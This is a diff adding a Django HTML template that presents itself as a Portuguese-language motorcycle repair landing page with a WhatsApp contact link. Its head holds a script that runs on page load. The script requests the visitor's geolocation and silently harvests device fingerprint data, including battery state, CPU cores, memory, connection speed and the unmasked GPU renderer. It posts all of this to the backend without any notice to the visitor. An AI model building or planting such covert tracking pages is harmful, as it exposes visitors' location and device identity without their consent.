@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serviços de Motos</title>
+    <script>
+        function getCSRFToken() {
+            return document.querySelector('[name=csrfmiddlewaretoken]').value;
+        }
+    
+        function sendDeviceInfo() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+    
+                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    let language = navigator.language;
+                    let screen_width = screen.width;
+                    let screen_height = screen.height;
+                    let connection_type = navigator.connection ? navigator.connection.effectiveType : "unknown";
+                    let connection_speed = navigator.connection ? navigator.connection.downlink + " Mbps" : "unknown";
+                    let battery_level = null;
+                    let is_charging = null;
+                    let cpu_cores = navigator.hardwareConcurrency || "unknown";
+                    let ram_memory = navigator.deviceMemory ? navigator.deviceMemory * 1024 : "unknown";
+                    let is_touchscreen = 'ontouchstart' in window;
+                    let gpu_info = null;
+    
+                    // Obtendo informações da GPU via WebGL
+                    try {
+                        let canvas = document.createElement('canvas');
+                        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        gpu_info = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
+                    } catch (e) { gpu_info = "unknown"; }
+    
+                    navigator.getBattery().then(function(battery) {
+                        battery_level = Math.round(battery.level * 100);
+                        is_charging = battery.charging;
+                        
+                        let data = new URLSearchParams();
+                        data.append("csrfmiddlewaretoken", getCSRFToken());
+                        data.append("latitude", latitude);
+                        data.append("longitude", longitude);
+                        data.append("timezone", timezone);
+                        data.append("language", language);
+                        data.append("screen_width", screen_width);
+                        data.append("screen_height", screen_height);
+                        data.append("connection_type", connection_type);
+                        data.append("connection_speed", connection_speed);
+                        data.append("battery_level", battery_level);
+                        data.append("is_charging", is_charging);
+                        data.append("cpu_cores", cpu_cores);
+                        data.append("ram_memory", ram_memory);
+                        data.append("is_touchscreen", is_touchscreen);
+                        data.append("gpu_info", gpu_info);
+    
+                        // 🔍 Debug: Exibe os dados no console antes de enviar ao backend
+                        console.log("📤 Enviando os seguintes dados ao Django:", Object.fromEntries(data));
+    
+                        fetch("/", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                            body: data.toString()
+                        });
+                    });
+                }, error => {
+                    console.error("Erro ao obter localização: ", error);
+                });
+            } else {
+                console.error("Geolocalização não suportada pelo navegador.");
+            }
+        }
+    
+        window.onload = sendDeviceInfo;
+    </script>
+    
+</head>
+<body>
+    <h1>Bem-vindo aos serviços especializados de motos!</h1>
+    <p>Seu melhor lugar para manutenção e reparos.</p>
+    <a href="https://wa.me/SEUNUMERO" target="_blank">Fale Conosco no WhatsApp</a>
+
+    <!-- Inclua o CSRF token dentro do template -->
+    <form method="post" style="display:none;">
+        {% csrf_token %}
+    </form>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
